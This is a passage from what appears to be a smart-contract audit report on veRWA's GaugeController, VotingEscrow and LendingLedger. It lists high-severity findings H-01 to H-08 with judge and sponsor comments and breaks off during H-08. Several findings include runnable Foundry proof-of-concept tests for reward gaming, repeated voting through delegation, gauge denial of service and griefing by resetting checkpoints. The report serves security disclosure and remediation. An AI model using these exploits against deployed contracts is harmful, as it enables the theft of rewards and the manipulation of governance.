@@ -1,0 +1,201 @@
+[H-01] User doesn’t have to deposit for a week into the market to get their weekly reward from theLendingLedger
+Submitted bySpicyMeatball, also found bymert_eren,nonseodion,cducrest,immeas,popular00,0xComfyCat,GREY-HAWK-REACH,Yanchuan,ppetrov,kaden, andpep7siup
+In theLendingLedgercontract, a user is rewarded with CANTO tokens depending on how long he has his deposit in the market. Rewards are distributed for each week during which the deposit was inside the market. However, the user can cheat this condition because we are rounding down to the start of the week, so the user can deposit at 23:59 at the end of the week and withdraw at 00:00 and still get rewarded as if he had his deposit for the whole week.
+Proof of Concept
+Test case for theLendingLedger.t.solfunction setupStateBeforeClaim() internal {whiteListMarket();vm.prank(goverance);ledger.setRewards(0, WEEK*10, amountPerEpoch);// deposit into market at 23:59 (week 4)vm.warp((WEEK * 5) - 1);int256 delta = 1.1 ether;vm.prank(lendingMarket);ledger.sync_ledger(lender, delta);// airdrop ledger enough token balance for user to claimpayable(ledger).transfer(1000 ether);// withdraw at 00:00 (week 5)vm.warp(block.timestamp + 1);vm.prank(lendingMarket);ledger.sync_ledger(lender, delta * (-1));}function testClaimValidLenderOneEpoch() public {setupStateBeforeClaim();uint256 balanceBefore = address(lender).balance;vm.prank(lender);ledger.claim(lendingMarket, 0, type(uint256).max);uint256 balanceAfter = address(lender).balance;assertTrue(balanceAfter - balanceBefore == 1 ether);uint256 claimedEpoch = ledger.userClaimedEpoch(lendingMarket, lender);assertTrue(claimedEpoch - WEEK*4 == WEEK);}
+Tools Used
+Foundry
+Recommended Mitigation Steps
+It’s difficult to propose a solution for this exploit without major changes in the contract’s architecture. Perhaps we can somehow split the amount based on the time the sync was made inside the week, let’s say Alice’slast_syncwas in the middle of week0, she deposited 1 ether, thus her amount for the current epoch will be 1/2 ether. However there is a caveat, how do we fill the gaps? We can’t fill them with 1/2 ether. We can use this struct though,
+Amount {uint256 actualAmount,uint256 fraction}
+so we can usefractionfor the current epoch andactualAmount = 1 etherto fill the gaps.
+alcueca (Judge) increased severity to High and commented:
+Chosen as best due to clarity, conciseness, and presence of executable PoC
+The rationale behind the High severity is that the purpose of veRWA is to attract liquidity to certain contracts as voted by CANTO holders, and this vulnerability defeats the purpose of attracting liquidity completely.
+OpenCoreCH (veRWA) commented:
+Reward calculation is now based on a time-weighted balance. Btw, while implementing the fix I noticed that the PoC here does not really highlight the problem. In the PoC, there is only one lender, so even if we take the deposit time into account, this lender should receive 100% of the epoch rewards (as they provided 100% of the liquidity within the market during this epoch). I modified the PoC to a scenario where there are two lenders, with one that deposited only for one second and one for the whole week. The one that deposited for the whole week should receive ~604800 times more rewards for this epoch, which is now the case:
+functiontestTimeWeightedClaiming()public{whiteListMarket();int256delta=1.1ether;vm.prank(goverance);ledger.setRewards(0,WEEK*10,amountPerEpoch);vm.startPrank(lendingMarket);// users[2] deposits at beginning of epochvm.warp(WEEK*4);ledger.sync_ledger(users[2],delta);// lender deposits at 23:59 (week 4)vm.warp((WEEK*5) -1);ledger.sync_ledger(lender,delta);vm.stopPrank();// airdrop ledger enough token balance for user to claimpayable(ledger).transfer(1000ether);// withdraw at 00:00 (week 5)vm.warp(WEEK*5);vm.prank(lendingMarket);ledger.sync_ledger(lender,delta* (-1));uint256balanceBefore=address(lender).balance;vm.prank(lender);ledger.claim(lendingMarket,0,type(uint256).max);uint256balanceAfter=address(lender).balance;// Lender should receive rewards for 1 secondassertEq(balanceAfter-balanceBefore,1*1ether*1.1ether/ (1.1ether*WEEK+1.1ether));uint256balanceBefore2=address(users[2]).balance;vm.prank(users[2]);ledger.claim(lendingMarket,0,type(uint256).max);uint256balanceAfter2=address(users[2]).balance;// User2 should receive rewards for 1 weekassertEq(balanceAfter2-balanceBefore2,WEEK*1ether*1.1ether/ (1.1ether*WEEK+1.1ether));}
+
+OpenCoreCH (veRWA) confirmed on duplicate finding #71
+
+[H-02] Voters from VotingEscrow can vote infinite times in voteforgauge_weights() of GaugeController
+Submitted by0x73696d616f, also found bymert_eren,oakcobalt,SpicyMeatball,Tricko,0xComfyCat,QiuhaoLi,Team_Rocket,Yanchuan,immeas,GREY-HAWK-REACH,th13vn, 0xCiphky (1,2),ltyu,deadrxsezzz,nonseodion,lanrebayode77,0xDetermination,popular00, andkaden
+https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L211https://github.com/code-423n4/2023-08-verwa/blob/main/src/VotingEscrow.sol#L356
+Delegate mechanism inVotingEscrowallows infinite votes invote_for_gauge_weights()in theGaugeController. Users can then, for example, claim more tokens in theLendingLedgerin the market that they inflated the votes on.
+Proof of Concept
+VotingEscrowhas a delegate mechanism which lets a user delegate the voting power to another user.
+TheGaugeControllerallows voters who locked native inVotingEscrowto vote on the weight of a specific gauge.
+Due to the fact that users can delegate their voting power in theVotingEscrow, they may vote once in a gauge by callingvote_for_gauge_weights(), delegate their votes to another address and then call againvote_for_gauge_weights()using this other address.
+A POC was built in Foundry, add the following test toGaugeController.t.sol:
+functiontestDelegateSystemMultipleVoting()public{vm.deal(user1,100ether);vm.startPrank(gov);gc.add_gauge(user1);gc.change_gauge_weight(user1,100);vm.stopPrank();vm.deal(user2,100ether);vm.startPrank(gov);gc.add_gauge(user2);gc.change_gauge_weight(user2,100);vm.stopPrank();uint256v=10ether;vm.startPrank(user1);ve.createLock{value:v}(v);gc.vote_for_gauge_weights(user1,10_000);vm.stopPrank();vm.startPrank(user2);ve.createLock{value:v}(v);gc.vote_for_gauge_weights(user2,10_000);vm.stopPrank();uint256expectedWeight_=gc.get_gauge_weight(user1);assertEq(gc.gauge_relative_weight(user1,7days),50e16);uint256numDelegatedTimes_=20;for(uinti_;i_<numDelegatedTimes_;i_++) {addressfakeUserI_=vm.addr(i_+27);// random numvm.deal(fakeUserI_,1);vm.prank(fakeUserI_);ve.createLock{value:1}(1);vm.prank(user1);ve.delegate(fakeUserI_);vm.prank(fakeUserI_);gc.vote_for_gauge_weights(user1,10_000);}// assert that the weight is approx numDelegatedTimes_ more than expectedassertEq(gc.get_gauge_weight(user1),expectedWeight_*(numDelegatedTimes_+1) -numDelegatedTimes_*100);// relative weight has been increase by a lot, can be increased even more if wishedassertEq(gc.gauge_relative_weight(user1,7days),954545454545454545);}
+Tools Used
+Vscode, Foundry
+Recommended Mitigation Steps
+The vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past.
+Additionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.
+alcueca (Judge) commented:
+Chosen as best due to the clear and concise explanation, including business impact on the protocol, and including an executable PoC.
+OpenCoreCH (veRWA) confirmed on duplicate finding 86
+
+[H-03] When adding a gauge, its initial value has to be set by an admin or all voting power towards it will be lost
+Submitted bydeadrxsezzz, also found byoakcobalt,0xComfyCat,Yanchuan,Brenzee,bin2chen,auditsea,cducrest,markus_ether, andTeam_Rocket
+https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L118
+https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L204
+Voting power towards gauges will be lost and project will not work properly
+Proof of Concept
+The mappingtime_weighttakes a gauge as a param and returns the most recent timestamp a gauge has had its weight recorded/ updated. There are 2 ways to set this value: through_get_weightand_change_gauge_weight.
+function_get_weight(address_gauge_addr)privatereturns(uint256) {uint256t=time_weight[_gauge_addr];if(t>0) {Pointmemorypt=points_weight[_gauge_addr][t];for(uint256i;i<500; ++i) {if(t>block.timestamp)break;t+=WEEK;uint256d_bias=pt.slope*WEEK;if(pt.bias>d_bias) {pt.bias-=d_bias;uint256d_slope=changes_weight[_gauge_addr][t];pt.slope-=d_slope;}else{pt.bias=0;pt.slope=0;}points_weight[_gauge_addr][t] =pt;if(t>block.timestamp)time_weight[_gauge_addr] =t;}returnpt.bias;}else{return0;}}The problem in_get_weightis that the initial value of anytime_weight[_gauge_addr]will be 0. It will go through the entirety of the loop andtwill increase +1 week for every iteration. The problem is that even after 500 iterationstwill be< block.timestampso the value oftime_weight[_gauge_addr]will remain 0. Unless admins call manually_change_gauge_weightto set an initial value,time_weight[_gauge_addr]will remain 0. Any  time a user will use_get_weightto fill with recent data, the function will iterate over old values and will do nothing. Recent values won’t be set and anything depending on it will receive 0 as a recent value.function_change_gauge_weight(address_gauge,uint256_weight)internal{uint256old_gauge_weight=_get_weight(_gauge);uint256old_sum=_get_sum();uint256next_time= ((block.timestamp+WEEK) /WEEK) *WEEK;points_weight[_gauge][next_time].bias=_weight;time_weight[_gauge] =next_time;uint256new_sum=old_sum+_weight-old_gauge_weight;points_sum[next_time].bias=new_sum;time_sum=next_time;}Since_change_gauge_weightis not called withinadd_gauge, even if we expect the owners to call it, any votes happening in the time between the adding of the gauge and the admin set function will be lost. The user will only be able to retrieve them by later removing their vote and voting again.
+Here are 3 written test-cases which prove the statements above:functiontestWithoutManualSet()public{vm.startPrank(gov);gc.add_gauge(gauge1);vm.stopPrank();vm.startPrank(user1);ve.createLock{value:1ether}(1ether);gc.vote_for_gauge_weights(gauge1,10000);uintweight=gc.get_gauge_weight(gauge1);console.log("gauge's weight after voting: ",weight);vm.stopPrank();}functiontestWithManualSet()public{vm.startPrank(gov);gc.add_gauge(gauge1);gc.change_gauge_weight(gauge1,0);vm.stopPrank();vm.startPrank(user1);ve.createLock{value:1ether}(1ether);gc.vote_for_gauge_weights(gauge1,10000);uintweight=gc.get_gauge_weight(gauge1);console.log("gauge's weight after voting: ",weight);vm.stopPrank();}functiontestWithChangeMidway()public{vm.startPrank(gov);gc.add_gauge(gauge1);vm.stopPrank();vm.startPrank(user1);ve.createLock{value:1ether}(1ether);gc.vote_for_gauge_weights(gauge1,10000);uintweight=gc.get_gauge_weight(gauge1);console.log("gauge's weight after voting: ",weight);vm.stopPrank();vm.prank(gov);gc.change_gauge_weight(gauge1,0);vm.startPrank(user1);gc.vote_for_gauge_weights(gauge1,10000);weight=gc.get_gauge_weight(gauge1);console.log("gauge's weight after voting after admin set",weight);gc.vote_for_gauge_weights(gauge1,0);gc.vote_for_gauge_weights(gauge1,10000);weight=gc.get_gauge_weight(gauge1);console.log("gauge's weight after voting after admin set after vote reset",weight);}and the respective results:[PASS] testWithoutManualSet() (gas: 645984)Logs:gauge's weight after voting:  0[PASS] testWithManualSet() (gas: 667994)Logs:gauge's weight after voting:  993424657416307200[PASS] testWithChangeMidway() (gas: 744022)Logs:gauge's weight after voting:  0gauge's weight after voting after admin set 0gauge's weight after voting after admin set after vote reset 993424657416307200
+Tools Used
+Foundry
+Recommended Mitigation Steps
+Upon adding a gauge, make a call tochange_gauge_weightand set its initial weight to 0.
+__141345__ (Lookout) commented:
+Forget to initializetime_weight[]when add new gauge.
+
+[H-04] Delegated votes are locked when owner lock is expired
+Submitted byltyu, also found byqpzm,RED-LOTUS-REACH,bart1e,0xDING99YA,zhaojie,popular00,MrPotatoMagic,carrotsmuggler,pep7siup,3docSec,mert_eren,kaden,Yuki,seerether,KmanOfficial, cducrest (1,2),Tendency, andbin2chen
+https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L331
+https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L371-L374
+https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L383
+Indelegate()of VoteEscrow.sol, a user is able to delegate their locked votes to someone else, and undelegate (i.e. delegate back to themselves). When the user tries to re-delegate, either to someone else or themselves, the lock must not be expired. This is problematic because if a user forgets and lets their lock become expired, they cannot undelegate. This blocks withdrawal, which means their tokens are essentially locked forever.
+Proof of Concept
+To exit the system, Alice must callwithdraw(). However, since they’ve delegated, they will not be able to.
+functionwithdraw()externalnonReentrant{...require(locked_.delegatee==msg.sender,"Lock delegated");...}To re-delegate to themselves (undelegate), they calldelegate(alice.address). However, there is a check to see iftoLocked.endhas expired, which would be true since it would point to Alice’s lock.function delegate(address _addr) external nonReentrant {LockedBalance memory locked_ = locked[msg.sender];...LockedBalance memory fromLocked;LockedBalance memory toLocked;locked_.delegatee = _addr;if (delegatee == msg.sender) {...// @audit this else if will execute} else if (_addr == msg.sender) {// UndelegatefromLocked = locked[delegatee]; // @audit DelegateetoLocked = locked_; // @audit Alice's lock}...require(toLocked.end > block.timestamp, "Delegatee lock expired");This is a test to be added into VoteEscrow.t.sol. It can be manually run by executingforge test --match-test testUnSuccessUnDelegate.functiontestUnSuccessUnDelegate()public{testSuccessDelegate();vm.warp(ve.LOCKTIME() +1days);// Try to undelegatevm.startPrank(user1);vm.expectRevert("Delegatee lock expired");ve.delegate(user1);// Still user2(, , ,addressdelegatee) =ve.locked(user1);assertEq(delegatee,user2);}
+Recommended Mitigation Steps
+Consider refactoring the code to skiptoLocked.end > block.timestampif undelegating. For example, adding a small delay (e.g., 1 second) to the lock end time when a user undelegates.
+alcueca (Judge) commented:
+This vulnerability, if not found, would have meant that some users would have permanently lost assets in the form of voting power. While at that point the application owners would certainly warn users to not let their locks expire without undelegating, many users would not get the warning, as it is not that easy to make sure that every user is aware of something. The result is that time and again, users would get their tokens locked forever.
+OpenCoreCH (veRWA) confirmed on duplicate 112
+
+[H-05] It is possible to DoS all the functions related to some gauge inGaugeController
+Submitted bybart1e, also found by0xDetermination
+https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L91-L114
+https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L142
+https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L180
+https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L189
+https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L247
+_get_weightfunction is used in order to return the total gauge’s weight and it also updates past values of thepoints_weightmapping, iftime_weight[_gauge_addr]is less or equal to theblock.timestamp. It contains the following loop:
+for(uint256i;i<500; ++i) {if(t>block.timestamp)break;t+=WEEK;uint256d_bias=pt.slope*WEEK;if(pt.bias>d_bias) {pt.bias-=d_bias;uint256d_slope=changes_weight[_gauge_addr][t];pt.slope-=d_slope;}else{pt.bias=0;pt.slope=0;}points_weight[_gauge_addr][t] =pt;if(t>block.timestamp)time_weight[_gauge_addr] =t;}
+There are two possible scenarios:
+pt.bias > d_biaspt.bias <= d_bias
+The first scenario will always happen naturally, sincept.biaswill be the total voting power allocated for some point and since slope is a sum of all users’ slopes and slopes are calculated in such a way that<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>.
+However, it is possible to artificially changepoints_weight[_gauge_addr][t].biasby callingchange_gauge_weight(which can be only called by the governance). It important to notice here, thatchange_gauge_weightdoesn’t modifypoints_weight[_gauge_addr][t].slope
+change_gauge_weightdoes permit to change the weight to a smaller number than its current value, so it’s both perfectly legal and possible that governance does this at some point (it could be changing the weight to0or any other value smaller than the current one).
+Then, at some point when_get_weightis called, we will enter theelseblock becausept.biaswill be less than the sum of all user’s biases (since originally these values were equal, butpt.biaswas lowered by the governance). It will setpt.biasandpt.slopeto0.
+After some time, the governance may realise that the gauge’s weight is0, but should be bigger and may change it to some bigger value.
+We will have the situation wherepoints_weight[_gauge_addr][t].slope = 0andpoints_weight[_gauge_addr][t].bias > 0.
+If this happens and there is any nonzerochanges_weight[_gauge_addr]not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at_gauge_addrwill not work.
+It’s because, the following functions:
+checkpoint_gaugegauge_relative_weight_writegauge_relative_weight_change_gauge_weightchange_gauge_weightvote_for_gauge_weightsremove_gauge
+call_get_weightat some point.
+Let’s see what will happen in_get_weightwhen it’s called:
+uint256d_bias=pt.slope*WEEK;if(pt.bias>d_bias) {pt.bias-=d_bias;uint256d_slope=changes_weight[_gauge_addr][t];pt.slope-=d_slope;}else{
+We will enter theifstatement, becausept.biaswill be> 0andpt.slopewill be0(or some small value, if users give their voting power to gauge in the meantime), since it was previously set to0in theelsestatement and wasn’t touched when gauge’s weight was changed by the governance. We will:
+Subtractd_biasfrompt.biaswhich will succeedAttempt to subtractchanges_weight[_gauge_addr][t]fromd_slope
+However, there could be a user (or users) whose voting power allocation finishes attfor sometnot yet handled. It means thatchanges_weight[_gauge_addr][t] > 0(and ifpt.slopeis not0, thenchanges_weight[_gauge_addr][t]still may be greater than it).
+If this happens, then the integer underflow will happen inpt.slope -= d_slope;. It will now happen ineverycall to_get_weightand it won’t be possible to recover, because:
+vote_for_gauge_weightswill revertchange_gauge_weightwill revert
+as they call_get_weightinternally. So, it won’t be possible to modifypt.slopeandpt.biasfor any point in time, so therevertwill always happen for that gauge. It won’t even be possible to remove that gauge.
+So, in short, the scenario is as follows:
+Users allocate their voting power to a gaugeX.Governance at some point decreases the weight ofX.Users withdraw their voting power as the time passes, and finally the weight ofXdrops to0.Governance realises this and increases weight ofXsince it wants to incentivise users to provide liquidity inX.Voting power delegation of some user(s) ends some time after that and_get_weightattempts to subtractchanges_weight[_gauge_addr][t]from the current slope (which is either0or some small value) and it results in integer underflow.Xis unusable and it’s impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight ofXcannot be changed anymore andXcannot be even removed.
+Note that it is also possible to frontrun the call tochange_gauge_weightwhen the weight is set to a lower value- user with a lot of capital can watch the mempool and if weight is lowered to some valuex, he can give a voting power ofxto that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight =0. Then, governance will manually increase the weight to recover and DoS will happen as described.So it is only needed that governance decreases gauge’s weight at some point.
+Impact
+As stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.
+In order for this situation to succeed, governance has to decrease weight of some gauge, but I think it’s very likely, because:
+_get_weightchecks thatif (pt.bias > d_bias)and it handles the opposite situation, so it is anticipated that it may genuinely happen.It is definitely possible to decrease gauge’s weight and it’s even possible to zero it out (as in theremove_gauge).The situation whereold_biasis greater thanold_sum_bias + new_biasis handled invote_for_gauge_weights, but it may only happen when gauge’s weight was decreased by the governance.The situation whereold_slope.slopeis greater thanold_sum_slope + new_slope.slopeis also handled there, but it may only happen if we enter theelsestatement in_get_weight.
+So, it is predicted that gauge’s weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it’s likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn’t be if we assumed that governance would never allowed them to happen).
+Proof of Concept
+Please run the test below. The test shows slightly simplified situation where governance just sets weight to0forgauge1, but as I’ve described above, it suffices that it’s just changed to a smaller value and it may drop to0naturally as users withdraw their voting power. The following import will also have to be added:import {Test, stdError} from "forge-std/Test.sol";.
+functiontestPoC1()public{// gauge is being set upvm.startPrank(gov);gc.add_gauge(gauge1);gc.change_gauge_weight(gauge1,0);vm.stopPrank();// `user1` pays some money and adds his power to `gauge1`vm.startPrank(user1);ve.createLock{value:1ether}(1ether);gc.vote_for_gauge_weights(gauge1,10000);vm.warp(block.timestamp+10weeks);gc.checkpoint_gauge(gauge1);vm.stopPrank();// `user2` does the samevm.startPrank(user2);ve.createLock{value:1ether}(1ether);gc.vote_for_gauge_weights(gauge1,10000);vm.warp(block.timestamp+1weeks);gc.checkpoint_gauge(gauge1);vm.stopPrank();vm.warp(block.timestamp+1825days-14weeks);vm.startPrank(gov);// weight is changed to `0`, just to simplify// normally, weight would just be decreased here and then subsequently decreased by users when their// locking period is over until it finally drops to `0`// alternatively, some whale can frontrun a call to `change_gauge_weight` as described and then// withdraw his voting power leaving the gauge with `0` slope and `0` biasgc.change_gauge_weight(gauge1,0);vm.warp(block.timestamp+1weeks);// now, weight is changed to some bigger valuegc.change_gauge_weight(gauge1,1ether);vm.stopPrank();// some time passes so that user1's locking period endsvm.warp(block.timestamp+5weeks);// `user2` cannot change his weight although his `locked.end` is big enoughvm.prank(user2);vm.expectRevert(stdError.arithmeticError);gc.vote_for_gauge_weights(gauge1,0);// governance cannot change weightvm.startPrank(gov);vm.expectRevert(stdError.arithmeticError);gc.change_gauge_weight(gauge1,2ether);// governance cannot even remove the gauge// it's now impossible to do anything on gauge1vm.expectRevert(stdError.arithmeticError);gc.remove_gauge(gauge1);vm.stopPrank();}
+Tools Used
+VS Code
+Recommended Mitigation Steps
+Performpt.slope -= d_slopein_get_weightonly whenpt.slope >= d.slopeand otherwise zero it out.
+__141345__ (Lookout) commented:
+pt.slope -= d_slopeunderflow, DoS gauge operation.
+OpenCoreCH (veRWA) confirmed
+alcueca (Judge) commented:
+This finding does a great job at describing the vulnerability and its impact from a computational point of view, including an executable PoC. Its duplicate#386is also worthy of note since it explains the root cause from a mathematical point of view. Although this finding was selected as best, both findings should be read for their complementary points of view.
+
+[H-06] Users may be forced into long lock times to be able to undelegate back to themselves
+Submitted byADM, also found by lsaudit (1,2),QiuhaoLi, Jorgect (1,2),SpicyMeatball, bart1e (1,2),Yanchuan,3docSec,MrPotatoMagic, nemveer (1,2),Yuki,kaden, nonseodion (1,2),Watermelon,RandomUser, BenRai (1,2),cducrest,Topmark,Tendency,0xDING99YA, andKow
+Due to a check requiring users only be able to delegate to others or themselves with longer lock times and verwa’s restrictions of all changes increasing lock times by 5 years users may be forced to remain delegated to someone they do not wish to be or extend their lock much longer than they wish.
+Proof of Concept
+If a user does not delegate to another user who started their lock during the same epoch they will be unable to undelegate back to themselves without extending their own lock. This is not much of an issue if they wish to do so early in the lock period but can become a problem if they wish to delegate to themselves after a longer period of time. i.e.
+Bob creates lock in week 1.Dave create lock in week 2 & Bob delegates to Dave.3 years pass and Bob decides he wishes to undelegate his votes back to himself and calls delegate(msg.sender) but the call will fail due to the check in VotingEscrow#L384:
+require(toLocked.end>=fromLocked.end,"Only delegate to longer lock");
+In the original FiatDAO contracts a user would be able to just extend their lock by one week to get around this however any changes in the verwa contract results in an extension of 5 years which the user may not want extend their lock by such a long time just to be able to undelegate.
+The undelegate fail can be shown by modifying the test testSuccessDelegate to:
+functiontestSuccessDelegate()public{// successful delegatetestSuccessCreateLock();vm.warp(8days);// warp more than 1 week so both users are not locking in same epochvm.prank(user2);ve.createLock{value:LOCK_AMT}(LOCK_AMT);vm.prank(user1);ve.delegate(user2);(, , ,addressdelegatee) =ve.locked(user1);assertEq(delegatee,user2);(, ,int128delegated, ) =ve.locked(user2);assertEq(delegated,2000000000000000000);}
+and running:forge test--match testSuccessUnDelegate
+Recommended Mitigation Steps
+Modify VotingEscrow#L384 to:
+require(toLocked.end>=locked_.end,"Only delegate to self or longer lock");
+which will allow users to delegate either to longer locks or undelegate back to themselves.
+alcueca (Judge) increased severity to High and commented:
+I’m merging#245into this one as the root cause and general mechanics are the same, only that in the 245 group the intent was malicious and in this group is not.At the same time, I’m upgrading the severity to High. Locking CANTO for an additional 5 years, considering that this is by nature a volatile environment, has an extremely high chance of resulting in losses due to market movements or other factors.
+OpenCoreCH (veRWA) confirmed on duplicate 178
+
+[H-07] lack of access control inLendingLedger.sol#checkpoint_lenderand functioncheckpoint_market
+Submitted byladboy233
+Note: This audit was preceded by aCode4rena Test Coverage competition. While auditing was not the purpose of the testing phase, relevant and valuable findings reported during that phase were eligible to be judged. This finding [H-07] was discovered during that period and is being included here for completeness.
+User’s claim andsync_lenderwill be griefed at low cost.
+Proof of Concept
+/// @notice Trigger a checkpoint explicitly.///     Never needs to be called explicitly, but could be used to ensure the checkpoints within the other functions consume less gas (because they need to forward less epochs)/// @param _market Address of the market/// @param _forwardTimestampLimit Until which epoch (provided as timestamp) should the update be applied. If it is higher than the current epoch timestamp, this will be used.functioncheckpoint_market(address_market,uint256_forwardTimestampLimit)externalis_valid_epoch(_forwardTimestampLimit) {require(lendingMarketTotalBalanceEpoch[_market] >0,"No deposits for this market");_checkpoint_market(_market,_forwardTimestampLimit);}/// @param _market Address of the market/// @param _lender Address of the lender/// @param _forwardTimestampLimit Until which epoch (provided as timestamp) should the update be applied. If it is higher than the current epoch timestamp, this will be used.functioncheckpoint_lender(address_market,address_lender,uint256_forwardTimestampLimit)externalis_valid_epoch(_forwardTimestampLimit) {require(lendingMarketBalancesEpoch[_market][_lender] >0,"No deposits for this lender in this market");_checkpoint_lender(_market,_lender,_forwardTimestampLimit);}
+
+These two functions lack access control, the caller is never validated, meaning anyone can call this function.
+The market is not validated to see if the market is whitelisted or not.
+The timestamp is never validated, the is_valid_epoch(_forwardTimestampLimit) is insufficient.
+/// @notice Check that a provided timestamp is a valid epoch (divisible by WEEK) or infinity/// @param _timestamp Timestamp to checkmodifieris_valid_epoch(uint256_timestamp) {require(_timestamp%WEEK==0||_timestamp==type(uint256).max,"Invalid timestamp");_;}
+The user can just pick a past timestamp as the _forwardTimestampLimit.
+For example, if we set _forwardTimestampLimit to 0.
+Then for example in _checkpoint_market
+function_checkpoint_market(address_market,uint256_forwardTimestampLimit)private{uint256currEpoch= (block.timestamp/WEEK) *WEEK;uint256lastMarketUpdateEpoch=lendingMarketTotalBalanceEpoch[_market];uint256updateUntilEpoch=Math.min(currEpoch,_forwardTimestampLimit);if(lastMarketUpdateEpoch>0&&lastMarketUpdateEpoch<currEpoch) {// Fill in potential gaps in the market total balances historyuint256lastMarketBalance=lendingMarketTotalBalance[_market][lastMarketUpdateEpoch];for(uint256i=lastMarketUpdateEpoch;i<=updateUntilEpoch;i+=WEEK) {lendingMarketTotalBalance[_market][i] =lastMarketBalance;}}lendingMarketTotalBalanceEpoch[_market] =updateUntilEpoch;}
+We set the lendingMarketTotalBalanceEpoch[_market] to 0.
+Then if the next call of the _checkpoint_market, the for loop would never run because the lastMarketUpdateEpoch is 0.
+Over time, even when the for loop inside _checkpoint_market does run, the caller are forced to pay very high gas fee.
+Same issue applies to _checkpoint_lender as well.
+User can decrease lendingMarketBalancesEpoch, even to 0.
+Basically, if a malicious actor call these two function with forwardTimestampLimit 0.
+Then the _checkpoint_lender and _checkpointmarket would never run inside sync\ledger and claim reward.
+Because user’s reward can be griefed to 0 and stated are failed to updated properly.
+POC 1:
+functiontestLackOfAccessControlSyncMarket_POC_1()public{payable(ledger).transfer(1000ether);uint248amountPerEpoch=1ether;uint256fromEpoch=WEEK*5;uint256toEpoch=WEEK*10;addresslendingMarket=vm.addr(5201314);vm.prank(goverance);ledger.setRewards(fromEpoch,toEpoch,amountPerEpoch);vm.warp(block.timestamp+WEEK);vm.prank(goverance);ledger.whiteListLendingMarket(lendingMarket,true);addresslender=users[1];vm.startPrank(lendingMarket);int256deltaStart=1ether;uint256epochStart= (block.timestamp/WEEK) *WEEK;ledger.sync_ledger(lender,deltaStart);// gaps of 3 weekuint256newTime=block.timestamp+3*WEEK;vm.warp(newTime);int256deltaEnd=1ether;uint256epochEnd= (newTime/WEEK) *WEEK;ledger.sync_ledger(lender,deltaEnd);newTime=block.timestamp+20*WEEK;vm.warp(newTime);console.log("---sync ledger after set the update epoch to 0 --");// ledger.checkpoint_market(lendingMarket, 0);// ledger.checkpoint_lender(lendingMarket, lender, 0);ledger.sync_ledger(lender,deltaEnd);vm.stopPrank();vm.prank(lender);uint256balanceBefore=address(lender).balance;ledger.claim(lendingMarket,fromEpoch,toEpoch);uint256balanceAfter=address(lender).balance;console.log(balanceAfter-balanceBefore);vm.expectRevert("No deposits for this user");ledger.claim(lendingMarket,fromEpoch,toEpoch);}
+
+If we run the POC, we get the normal result, user can claim and get 6 ETH as reward.
+---syncledgeraftersettheupdateepochto0--6000000000000000000
+If we uncomment:
+// ledger.checkpoint_market(lendingMarket, 0);// ledger.checkpoint_lender(lendingMarket, lender, 0);
+The claimed reward goes to 0.
+Recommended Mitigation Steps
+Add access control to checkpoint_market and checkpoint_lender.
+OpenCoreCH (veRWA) confirmed and commented:
+This was a valid issue before the auditing contest (uncovered during the testing contest and fixed before the auditing contest), pasting my comment from there for reference:Good point. It is generally intended that everyone can call these functions (should not be necessary in practice, but may be in some edge cases where a market was inactive for years) and I do not think that this is problematic per se. However, the problem here is that users can decreaselendingMarketBalancesEpochorlendingMarketTotalBalanceEpoch, which should never happen. So I will probably change the code like this (and the same for lenders) such that this can never happen:if(lastMarketUpdateEpoch>0&&lastMarketUpdateEpoch<currEpoch) {// Fill in potential gaps in the market total balances historyuint256lastMarketBalance=lendingMarketTotalBalance[_market][lastMarketUpdateEpoch];for(uint256i=lastMarketUpdateEpoch;i<=updateUntilEpoch;i+=WEEK) {lendingMarketTotalBalance[_market][i] =lastMarketBalance;}if(updateUntilEpoch>lastMarketUpdateEpoch) {lendingMarketTotalBalanceEpoch[_market] =updateUntilEpoch;}}
+
+[H-08] If governance removes a gauge, user’s voting power for that gauge will be lost
+Submitted bythekmj, also found bymert_eren,popular00,Eeyore,immeas,bart1e,0xCiphky,ltyu,0xbrett8571,deadrxsezzz,0xDetermination,Tripathi,Team_Rocket, andpep7siup
+https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L127-L132
+https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L213
+https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L241
+If governance removes a gauge for any (non-malicious) reason, a user’s voting power for that gauge will be completely lost.
+Vulnerability details
